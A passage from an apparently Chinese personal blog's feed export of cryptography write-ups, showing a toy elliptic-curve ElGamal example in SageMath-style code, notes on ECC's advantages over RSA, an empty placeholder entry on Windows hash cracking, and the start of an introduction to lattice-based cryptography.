class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span></p>
<p>举个梨子</p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre># <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> Alice 公开公钥 <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">3851</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">324</span><span class="token punctuation">,</span> <span class="token number">1287</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>G <span class="token operator">=</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">920</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>nA <span class="token operator">=</span> <span class="token number">1194</span></pre></td></tr><tr><td data-num="6"></td><td><pre>PA <span class="token operator">=</span> nA <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>PA<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre># <span class="token punctuation">(</span><span class="token number">2067</span><span class="token punctuation">,</span> <span class="token number">2178</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre># <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> Bob 发送信息 <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="13"></td><td><pre>M <span class="token operator">=</span> E<span class="token punctuation">.</span><span class="token function">lift_x</span><span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>k <span class="token operator">=</span> <span class="token number">123</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>C1 <span class="token operator">=</span> k <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="17"></td><td><pre>C2 <span class="token operator">=</span> M <span class="token operator">+</span> k <span class="token operator">*</span> PA</pre></td></tr><tr><td data-num="18"></td><td><pre>C1<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> C2<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre># <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2525</span><span class="token punctuation">,</span> <span class="token number">1772</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">2423</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre># <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> Alice 接受信息 <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="23"></td><td><pre>msg <span class="token operator">=</span> C2 <span class="token operator">-</span> nA <span class="token operator">*</span> C1</pre></td></tr><tr><td data-num="24"></td><td><pre>msg<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre># <span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">495</span><span class="token punctuation">)</span></pre></td></tr></table></figure><hr />
<h2 id="椭圆曲线密码体制的优点"><a class="anchor" href="#椭圆曲线密码体制的优点">#</a> 椭圆曲线密码体制的优点</h2>
<p>与基于有限域于上离散对数体系相比</p>
<ol>
<li>
<p>安全性高</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>攻击有限域上的离散对数问题是有指数积分法，运算复杂度为</mtext><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mi>x</mi><mi>p</mi><mroot><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>p</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mn>3</mn></mroot><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>p</mi><mtext>是模素数</mtext></mrow><annotation encoding="application/x-tex">攻击有限域上的离散对数问题是有指数积分法，运算复杂度为O(exp\sqrt[3]{(logp)(loglogp)^2}),p是模素数
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.25612499999999994em;"></span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">杂</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.75887em;"><span style="top:-2.93665em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.983875em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9438750000000002em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119
c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
c340,-704.7,510.7,-1060.3,512,-1067
l0 -0
c4.7,-7.3,11,-11,19,-11
H40000v40H1012.3
s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
M1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.25612499999999994em;"><span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>目前攻击椭圆曲线上的离散对数问题只适合攻击任何循环群上离散对数问题的大步小步法，</mtext><mspace linebreak="newline"></mspace><mtext>运算复杂度为</mtext><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mi>x</mi><mi>p</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><msqrt><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></msqrt><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace width="1em"/><msub><mi>p</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mtext>是椭圆曲线上</mtext><mi>A</mi><mi>b</mi><mi>e</mi><mi>l</mi><mtext>群的阶的最大素因子</mtext></mrow><annotation encoding="application/x-tex">目前攻击椭圆曲线上的离散对数问题只适合攻击任何循环群上离散对数问题的大步小步法，\\运算复杂度为O(exp(log\sqrt {p_{max}})) \quad p_{max}是椭圆曲线上Abel群的阶的最大素因子
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">适</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">何</span><span class="mord cjk_fallback">循</span><span class="mord cjk_fallback">环</span><span class="mord cjk_fallback">群</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.28806499999999996em;"></span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">杂</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751935em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.711935em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.28806499999999996em;"><span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">上</span><span class="mord mathnormal">A</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">群</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">阶</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">子</span></span></span></span></span></p>
</li>
<li>
<p>密钥量小</p>
<p>复杂度对比，椭圆曲线所需密钥长度更短</p>
</li>
<li>
<p>灵活性好</p>
<p>椭圆曲线可以通过更改曲线参数实现不同的曲线，形成不同的循环群，比有限域上固定好的循环群更加丰富且多选择</p>
</li>
</ol>
<p>ECC 和 RSA/DSA 在保持同等安全性的情况下密钥长度对比 (bits)</p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>RSA/DSA</strong></th>
<th style="text-align:center"><strong>512</strong></th>
<th style="text-align:center"><strong>768</strong></th>
<th style="text-align:center"><strong>1024</strong></th>
<th style="text-align:center"><strong>2048</strong></th>
<th style="text-align:center"><strong>21000</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>ECC</strong></td>
<td style="text-align:center"><strong>106</strong></td>
<td style="text-align:center"><strong>132</strong></td>
<td style="text-align:center"><strong>160</strong></td>
<td style="text-align:center"><strong>211</strong></td>
<td style="text-align:center"><strong>600</strong></td>
</tr>
</tbody>
</table>
<p>Diffie-Hellman 算法主要是实现密钥交换，并没有加密解密的算法，理解起来可能有些抽象，不过不抽象也就不是数学了。椭圆曲线上的密码体系目前也只是潦草掌握，毕竟 ECC 和离散一样也是一座数学大山。怎么说呢，学无止境吧。</p>
<p>如果你读的还算尽兴的话给个赞哦👍</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>DH</tag>
      </tags>
  </entry>
  <entry>
    <title>HASH破解</title>
    <url>/crypto/write/HASH%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<p>待写<br />
<a id="more"></a><br />
 简单论述 windows hash 破解</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>Lattice Based Crypto</title>
    <url>/crypto/write/Lattice%20Based%20Crypto/</url>
    <content><![CDATA[<p>Lattice 作为全同态加密的基础代数结构，值得学习一下；最关键的一点，LBC 至今为止不能被量子计算机破解。这正如 20 年前的椭圆曲线代数结构，正如 40 年前的 RSA 代数结构一样。<br />
<a id="more"></a><br />
Lattice 的本质是高维空间中几何学和代数学的组合，学起来会超级困难，一点也不亚于高考数学的挑战难度。密码学本身要求研究者对代数学有比较深入的理解，学起来很晦涩，所以我会尽全力将搜罗到的一些知识整合得更完整可读一些，并适当掺加一点自己的见解（如果都对的话）</p>
<p>在格理论密码系统出现之前，没有合适的问题可以用于构造同态加密系统。</p>
<p>没有哪个密码体系能有如此的抗量子攻击，格密码的算法效率令 RSA 望尘莫及，以及拥有超强的安全保障</p>
<h2 id="格-定义"><a class="anchor" href="#格-定义">#</a> 格 定义</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>格</mtext><mo stretchy="false">(</mo><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo><mtext>设</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mo>∈</mo><msup><mi>R</mi><mi>m</mi></msup><mtext>是线性无关向量组。</mtext><mspace linebreak="newline"></mspace><mtext>我们称</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mtext>生成了</mtext><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>L</mi><mtext>：即</mtext><mi>L</mi><mtext>中的元素是</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mtext>的整系数线性组合。</mtext><mspace linebreak="newline"></mspace><mtext>我们定义</mtext><mi>L</mi><mtext>的一个基</mtext><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>i</mi><mi>s</mi><mo stretchy="false">)</mo><mtext>是任何一个能生成</mtext><mi>L</mi><mtext>的向量组。</mtext><mspace linebreak="newline"></mspace><mtext>显然</mtext><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>的两个基会拥有相同的向量个数；基所包含的的向量个数称为</mtext><mi>L</mi><mtext>的纬度</mtext><mo stretchy="false">(</mo><mi>d</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">格(lattice)设 v_1,...,v_n \in R^m是线性无关向量组。\\我们称 v_1,...,v_n生成了 lattice L：
即L 中的元素是 v_1,...,v_n的整系数线性组合。\\
我们定义L 的一个基(basis)是任何一个能生成 L的向量组。\\显然 lattice 的两个基会拥有相同的向量个数；基所包含的的向量个数称为 L的纬度(dimension).
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">格</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mord cjk_fallback">设</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">称</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">了</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">何</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">显</span><span class="mord cjk_fallback">然</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">拥</span><span class="mord cjk_fallback">有</span><span class="mord 